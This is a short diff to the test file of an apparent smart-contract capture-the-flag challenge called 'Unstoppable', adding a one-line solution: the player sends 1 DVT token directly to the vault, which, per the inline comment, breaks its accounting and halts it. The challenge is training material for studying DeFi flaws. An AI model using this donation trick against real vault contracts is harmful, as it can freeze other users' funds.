@@ -45,6 +45,8 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        await token.connect(player).transfer(vault.address, 1)//breaking the accounting by simply transfering the 1 DVT token.
+        
     });
 
     after(async function () {
